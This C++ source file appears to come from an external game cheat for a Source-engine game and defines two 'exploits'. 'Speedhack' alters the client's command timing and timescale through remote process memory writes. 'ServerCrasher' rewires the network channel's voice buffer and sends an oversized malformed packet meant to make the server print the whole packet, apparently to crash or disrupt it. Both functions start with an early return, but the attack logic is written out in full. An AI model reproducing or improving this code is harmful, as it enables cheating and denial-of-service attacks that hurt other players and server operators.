#include "DumbExploits.h"
#include "../sdk/CClientState.h"
#include "../globals.h"
#include "../utils/Memutils.h"

namespace Exploits {
    void Speedhack() {
        return;
        if (netChan.m_chokedCommands < 15 && !pressedKeys[KEY_SPACE] && !pressedKeys[41])
            process->Write<double>(clientStateAddr + OFFSET_OF(&CClientState::m_nextCmdTime), std::numeric_limits<double>::max());
        else
            process->Write<double>(clientStateAddr + OFFSET_OF(&CClientState::m_nextCmdTime), 0.0);


        if (pressedKeys[KEY_W] && pressedKeys[KEY_X]) {
            process->Write<float>(timescale, 5.0f);
        } else {
            process->Write<float>(timescale, 1.0f);
        }

        return;
        static bool bSwitch = false;
        static bool activated = true;

        if (!(globalVars.tickCount % 20)) {
            activated = true;
        }
        if (!(globalVars.framecount % 40) && activated) {
            bSwitch = !bSwitch;
        }

        static int last = 0;
        Vector vel = localPlayer.velocity;
        float speed = vel.Length();
        const float target = 800.0f;

        float velFactor = 0.0f;

        if (!(localPlayer.GetFlags() & FL_ONGROUND)) {
            velFactor = 4000.0f;
        }
        velFactor += target;

        if (speed == 0.0f)
            return;

        float factor = velFactor / speed;
        if (factor < 1.0f) {
            factor = 1.0f;
        }

        if (factor > 3.0f) {
            factor = 5.0f;
        }

        if (pressedKeys[KEY_W] && pressedKeys[KEY_LEFTCTRL] && pressedKeys[KEY_X] && bSwitch && netChan.m_chokedCommands < 12) {
            process->Write<float>(timescale, factor);
        } else if (!pressedKeys[KEY_W] || !pressedKeys[KEY_LEFTCTRL] || !pressedKeys[KEY_C]) {
            activated = false;
            process->Write<float>(timescale, 1.0f);
        } else {
            process->Write<float>(timescale, 1.0f);
        }

    }

    // first concept didnt work shiet
    void ServerCrasher() {
        return;

        // set voicestream buffer to 0x3000 bytes into the reliable stream so we have a big buffer to works with
        // since the reliableStream is like 260k bytes
        netChan.m_streamVoice.m_data = (void *) ((uintptr_t) netChan.m_streamReliable.m_data + 0x3000);
        netChan.m_streamVoice.m_dataBytes = netChan.m_streamReliable.m_dataBytes - 0x3000;
        netChan.m_streamVoice.m_dataBits = netChan.m_streamVoice.m_dataBytes * 8;

        // also change the UtlMemory buffer accordingly
        netChan.m_voiceDataBuffer.m_memory = netChan.m_streamVoice.m_data;
        netChan.m_voiceDataBuffer.m_allocationCount = netChan.m_streamVoice.m_dataBytes;

        // maximum datagram size
        uint8_t data[0x40010];
        memset(data, 0, 0x40010);

        // either write 0x1000 away from max datagram size, or whatever the curent stream size is
        int32_t bytesToWrite = std::min(0x40010 - 0x3000/* - (netChan.m_sendStream.m_curBit / 8)*/, netChan.m_streamVoice.m_dataBytes);
        if (bytesToWrite <= 0)
            return;

        // change the curbit to reflect the amount of bytes we are writing
        netChan.m_streamVoice.m_curBit = bytesToWrite * 8;

        // write 0xFF to get an invalid message - server will print the whole packet
        data[bytesToWrite - 2] = 0xFF;

        // write our data into the buffer ingame and then write the netchannel to reflect our changes
        VMemWrite(&process->ctx->process, process->proc.dirBase, (uint64_t) data, (uint64_t) netChan.m_streamVoice.m_data, bytesToWrite);
        process->Write<CNetChan>((uint64_t) clientState.m_netChan, netChan);
    }
}